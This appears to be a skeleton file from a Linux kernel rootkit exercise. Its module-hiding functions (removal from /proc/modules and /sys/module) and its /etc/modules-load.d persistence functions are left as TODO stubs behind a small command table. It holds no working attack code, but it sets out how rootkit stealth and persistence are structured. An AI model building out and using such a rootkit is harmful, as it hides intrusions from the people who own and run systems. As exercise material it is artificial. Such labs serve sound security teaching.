// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>

/* Module hiding: remove/restore THIS_MODULE from both inventories */

static struct list_head *saved_prev;
static struct kobject *saved_parent;

void rk_module_hide(void)
{
	// TODO 1: hide the module from both /proc/modules and /sys/module
}

void rk_module_unhide(void)
{
	// TODO 2: restore the module to both inventories exactly once
}

/* Persistence: write/clear /etc/modules-load.d entry */

static int rk_persist(void)
{
	// TODO 3: replace the autoload file with the module name and a newline
	return -EOPNOTSUPP;
}

static int rk_unpersist(void)
{
	// TODO 4: clear the autoload file
	return -EOPNOTSUPP;
}

/* Command handlers */

static int cmd_persist(const char *arg) { return rk_persist(); }
static int cmd_unpersist(const char *arg) { return rk_unpersist(); }
static int cmd_hide_module(const char *arg) { rk_module_hide(); return 0; }
static int cmd_unhide_module(const char *arg) { rk_module_unhide(); return 0; }

static const struct rk_cmd_entry module_cmds[] = {
	{ "persist",   cmd_persist },
	{ "unpersist", cmd_unpersist },
	{ "h.m",       cmd_hide_module },
	{ "u.m",       cmd_unhide_module },
};

int rk_module_cmds_init(void)
{
	return rk_cmds_register(module_cmds, ARRAY_SIZE(module_cmds));
}
